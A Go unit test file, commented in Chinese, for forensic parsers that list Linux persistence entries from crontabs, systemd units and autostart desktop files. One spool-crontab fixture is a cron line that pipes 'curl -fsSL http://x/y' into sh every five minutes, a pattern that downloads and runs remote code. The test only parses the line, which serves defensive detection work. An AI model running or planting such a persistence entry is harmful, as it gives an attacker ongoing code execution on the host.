// 本测试文件 NEUTRAL（无构建标签）：Linux 持久化条目解析纯逻辑在 Windows
// 上跑（验证口径，见 persist_linuxparse.go 头注释）。
package liveapi

import (
	"strings"
	"testing"
	"time"
)

func TestParseCrontabFile(t *testing.T) {
	sysTab := strings.Join([]string{
		"# /etc/crontab: system-wide crontab",
		"SHELL=/bin/sh",
		"17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly",
		"25 6  * * *   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.daily)",
		"@reboot       root    /usr/local/bin/phoenix.sh",
		"0 3 * * * backup rsync -a /data /mnt/bak",
		"残行",
		"",
	}, "\n")
	items := parseCrontabFile("/etc/crontab", []byte(sysTab), true)
	if len(items) != 4 {
		t.Fatalf("期望 4 条（注释/环境变量行/残行跳过）实得 %d: %+v", len(items), items)
	}
	if items[0].User != "root" || items[0].Source != "task" ||
		!strings.HasPrefix(items[0].Command, "cd / && run-parts") {
		t.Errorf("系统表条目口径不符: %+v", items[0])
	}
	// @reboot：调度语义在 Name 里可见
	if !strings.Contains(items[2].Name, "@reboot") ||
		!strings.HasPrefix(items[2].Command, "/usr/local/bin/phoenix.sh") {
		t.Errorf("@reboot 条目口径不符: %+v", items[2])
	}
	if items[3].User != "backup" || !strings.HasPrefix(items[3].Command, "rsync") {
		t.Errorf("多用户列口径不符: %+v", items[3])
	}

	// 用户 spool：无 user 列，5 列时间 + 命令
	spool := "30 4 * * 0 /opt/jobs/weekly.sh\n*/5 * * * * curl -fsSL http://x/y | sh\n"
	items2 := parseCrontabFile("/var/spool/cron/crontabs/alice", []byte(spool), false)
	if len(items2) != 2 {
		t.Fatalf("spool 期望 2 条实得 %d", len(items2))
	}
	if items2[0].User != "" || !strings.HasPrefix(items2[0].Command, "/opt/jobs/weekly.sh") {
		t.Errorf("spool 条目口径不符: %+v", items2[0])
	}
	if !strings.HasPrefix(items2[1].Command, "curl") {
		t.Errorf("管道命令应原样呈现: %+v", items2[1])
	}
}

func TestParseSystemdUnitExec(t *testing.T) {
	unit := strings.Join([]string{
		"[Unit]",
		"Description=Fake Service",
		"After=network.target",
		"",
		"[Service]",
		"Type=simple",
		"# ExecStart=/commented/out",
		"ExecStartPre=/usr/bin/touch /tmp/pre",
		"ExecStart=/opt/app/bin/agent --config /etc/app.conf",
		"ExecStartPost=/bin/true",
		"Restart=on-failure",
		"",
		"[Install]",
		"WantedBy=multi-user.target",
	}, "\n")
	exec, ok := parseSystemdUnitExec([]byte(unit))
	if !ok || exec != "/opt/app/bin/agent" {
		t.Errorf("ExecStart 提取口径不符: %q %v", exec, ok)
	}

	// [Unit] 节里的 ExecStart 不收；前缀修饰符剥离；引号去除
	unit2 := "[Unit]\nExecStart=/wrong/section\n[Service]\nExecStart=-\"/usr/sbin/srv\" --flag\n"
	exec2, ok2 := parseSystemdUnitExec([]byte(unit2))
	if !ok2 || exec2 != "/usr/sbin/srv" {
		t.Errorf("前缀修饰/引号/节作用域口径不符: %q %v", exec2, ok2)
	}

	// 无 ExecStart（timer/挂载目标）→ false
	if _, ok3 := parseSystemdUnitExec([]byte("[Unit]\nDescription=x\n")); ok3 {
		t.Errorf("无 ExecStart 应返回 false")
	}
}

func TestParseAutostartDesktop(t *testing.T) {
	desktop := strings.Join([]string{
		"[Desktop Entry]",
		"Type=Application",
		"Name=Updater",
		"Exec=/opt/upd/updater --silent",
		"Hidden=false",
		"X-GNOME-Autostart-enabled=true",
		"",
		"[Desktop Action second]",
		"Exec=/should/not/appear",
	}, "\n")
	name, exec, hidden := parseAutostartDesktop([]byte(desktop))
	if name != "Updater" || exec != "/opt/upd/updater --silent" || hidden {
		t.Errorf("desktop 解析口径不符: %q %q %v", name, exec, hidden)
	}
	// Hidden=true 如实带出（是否被藏起来交给调查者判断）
	_, exec2, hidden2 := parseAutostartDesktop([]byte("[Desktop Entry]\nName=x\nHidden=true\nExec=/bin/x\n"))
	if exec2 != "/bin/x" || !hidden2 {
		t.Errorf("Hidden=true 口径不符: %q %v", exec2, hidden2)
	}
}

func TestLinuxExtractExePath(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"/usr/bin/env python3 -c x", "/usr/bin/env"},
		{`"/opt/my app/srv" --flag`, "/opt/my app/srv"},
		{"sh -c 'curl x'", ""}, // 裸名命令依赖 PATH，不猜
		{"./relative --y", ""}, // 相对路径不猜
		{"", ""},
	}
	for _, c := range cases {
		if got := linuxExtractExePath(c.in); got != c.want {
			t.Errorf("%q: 期望 %q 实得 %q", c.in, c.want, got)
		}
	}
}

func TestBuildLinuxPersistenceResult(t *testing.T) {
	raws := []linuxPersistRaw{
		{Source: "task", Name: "/etc/cron.d/a", Command: "/x/a.sh", Location: "/etc/cron.d/a", Enabled: true},
		{Source: "service", Name: "app.service", Command: "/opt/app/agent", Location: "/etc/systemd/system/app.service", Enabled: true},
		{Source: "startup", Name: "upd", Command: "/opt/upd/u", Location: "/etc/xdg/autostart/u.desktop", Enabled: true},
	}
	res := buildLinuxPersistenceResult(raws, time.Unix(1700000000, 0))
	if res.Counts.Service != 1 || res.Counts.Task != 1 || res.Counts.Startup != 1 {
		t.Errorf("计数口径不符: %+v", res.Counts)
	}
	// 排序：来源序 service → task → startup
	if res.Items[0].Source != "service" || res.Items[1].Source != "task" || res.Items[2].Source != "startup" {
		t.Errorf("排序口径不符: %+v", res.Items)
	}
	// exe_path 提取对齐 Windows 口径（"首个可执行路径"）
	if res.Items[0].ExePath != "/opt/app/agent" {
		t.Errorf("exe_path 口径不符: %q", res.Items[0].ExePath)
	}
}
